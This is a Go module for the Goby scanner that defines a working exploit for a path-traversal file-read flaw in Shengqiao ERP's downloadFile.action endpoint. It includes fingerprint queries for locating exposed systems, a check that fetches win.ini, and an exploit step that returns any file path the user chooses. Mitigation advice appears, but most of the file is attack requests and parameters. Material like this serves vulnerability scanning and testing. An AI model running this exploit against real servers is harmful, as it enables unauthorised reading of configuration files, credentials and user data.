package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Shengqiao ERP /erp/wap/../downloadFile.action File Read Vulnerability",
    "Description": "<p>Shengqiao ERP is an enterprise resource planning software designed to help businesses optimize resource allocation and improve management efficiency. The /erp/wap/../downloadFile.action interface of Shengqiao ERP has a file read vulnerability, allowing attackers to access arbitrary files on the server by crafting specific requests. This vulnerability may lead to sensitive information disclosure, such as system configuration files and user data.</p>",
    "Product": "Shengqiao ERP",
    "Homepage": "http://www.hzsage.com/",
    "DisclosureDate": "2024-12-16",
    "PostTime": "2024-12-17",
    "Author": "1251220046@qq.com",
    "FofaQuery": "title=\"圣乔ERP系统\" && body=\"圣乔ERP系统\"",
    "GobyQuery": "title=\"圣乔ERP系统\" && body=\"圣乔ERP系统\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read critical system files (e.g., database configuration files, system configuration files) and user data, leading to sensitive information disclosure and potentially enabling privilege escalation or other attacks.</p>",
    "Recommendation": "<p>1. Follow the vendor's official website for updates: <a href=\"http://www.hzsage.com/.\">http://www.hzsage.com/.</a></p><p>2. Use security devices such as firewalls to set access policies and implement a whitelist.</p><p>3. Disable public access to the system unless necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "c:\\windows\\win.ini,C:/windows/system.ini",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "c:\\windows\\win.ini",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/erp/wap/../downloadFile.action?absolutePath=true&file=c:\\\\windows\\\\win.ini",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "Accept": "*/*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "; for 16-bit app support",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/erp/wap/../downloadFile.action?absolutePath=true&file={{{filePath_encode}}}",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "Accept": "*/*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "圣乔ERP系统 /erp/wap/../downloadFile.action 文件读取漏洞",
            "Product": "圣乔ERP系统",
            "Description": "<p>圣乔ERP系统是一款企业资源计划管理软件，旨在帮助企业优化资源配置和提高管理效率。圣乔ERP系统的 /erp/wap/../downloadFile.action 接口存在文件读取漏洞，攻击者可以通过构造特定的请求访问服务器上的任意文件。该漏洞可能导致敏感信息泄露，例如系统配置文件、用户数据等。</p>",
            "Recommendation": "<p>1、关注厂商官网，及时关注更新信息：<a href=\"http://www.hzsage.com/\">http://www.hzsage.com/</a>。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、用户数据等，导致敏感信息泄露，进一步可能引发权限提升或其他攻击。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Shengqiao ERP /erp/wap/../downloadFile.action File Read Vulnerability",
            "Product": "Shengqiao ERP",
            "Description": "<p>Shengqiao ERP is an enterprise resource planning software designed to help businesses optimize resource allocation and improve management efficiency. The /erp/wap/../downloadFile.action interface of Shengqiao ERP has a file read vulnerability, allowing attackers to access arbitrary files on the server by crafting specific requests. This vulnerability may lead to sensitive information disclosure, such as system configuration files and user data.</p>",
            "Recommendation": "<p>1. Follow the vendor's official website for updates: <a href=\"http://www.hzsage.com/.\">http://www.hzsage.com/.</a></p><p>2. Use security devices such as firewalls to set access policies and implement a whitelist.</p><p>3. Disable public access to the system unless necessary.</p>",
            "Impact": "<p>This vulnerability allows attackers to read critical system files (e.g., database configuration files, system configuration files) and user data, leading to sensitive information disclosure and potentially enabling privilege escalation or other attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "filePath_encode": "define|query_encode|{{{filePath}}}"
    },
    "VariablesOrder": [
        "filePath",
        "filePath_encode"
    ],
    "EditType": "fast",
    "PocId": "9978"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
